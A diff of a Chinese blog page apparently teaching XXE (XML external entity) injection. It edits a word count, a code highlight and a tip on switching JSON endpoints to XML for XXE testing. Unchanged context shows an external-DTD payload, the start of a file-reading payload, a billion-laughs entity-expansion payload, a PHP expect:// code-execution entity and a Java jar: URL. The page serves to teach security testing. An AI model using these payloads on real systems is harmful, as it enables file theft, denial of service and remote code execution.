@@ -454,7 +454,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    4.9k
+                    5k
                 </div>
                 
 
@@ -579,7 +579,7 @@
 <span class="token doctype">&lt;!DOCTYPE a SYSTEM "http://127.0.0.1:8090/note.dtd"></span>
 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>comment</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>text</span><span class="token punctuation">></span></span><span class="token entity" title="&b;">&amp;b;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>text</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>comment</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 <p>note.dtd：</p>
-<pre class="line-numbers language-stylus"><code class="language-stylus">&lt;!ENTITY b <span class="token string">"this is dtd"</span>><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">b</span> <span class="token attr-name">"this</span> <span class="token attr-name">is</span> <span class="token attr-name">dtd"</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>观察到内容在评论出回显：<br><img src="https://i.loli.net/2021/08/05/vsgxY1NbPHZwoS3.png"><br>读取磁盘文件回显：</p>
 <pre class="line-numbers language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8"?></span>
 <span class="token doctype">&lt;!DOCTYPE text [
@@ -666,7 +666,7 @@
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">lol9</span> <span class="token attr-name">"&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;"</span><span class="token punctuation">></span></span>
 ]>
 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>lolz</span><span class="token punctuation">></span></span><span class="token entity" title="&lol9;">&amp;lol9;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>lolz</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>另外在一些JSON格式的请求中可以尝试修改请求头<code>Content-Type: application/xml</code>，可对JSON接口进行XXE测试。</p>
+<p>另外在一些JSON格式的请求中可以尝试修改请求头<code>Content-Type: application/xml</code>，对JSON接口进行XXE测试；或者对JSON格式的数据进行一些破坏来观察服务器响应，有时候会出现类的报错，类又支持XML解析，就可以进行XXE的测试(也可以直接盲XXE测试)。</p>
 <h3 id="XXE协议支持"><a href="#XXE协议支持" class="headerlink" title="XXE协议支持"></a>XXE协议支持</h3><p>使用网上的一张图来描述：<br><img src="https://i.loli.net/2021/08/09/LhWV7beiMR8cpOq.png"><br>PHP中一些协议利用，如PHP开启了expect支持可以进行RCE，PHP XXE RCE:<br>having the PHP Expect module installed can result in code execution from an XXE attack (<!--ENTITY rce SYSTEM “expect://ifconfig” -->).</p>
 <p>JAVA中jar协议的使用方法：</p>
 <pre class="line-numbers language-html"><code class="language-html">local => jar:file:///var/myarchive.zip!/file.txt
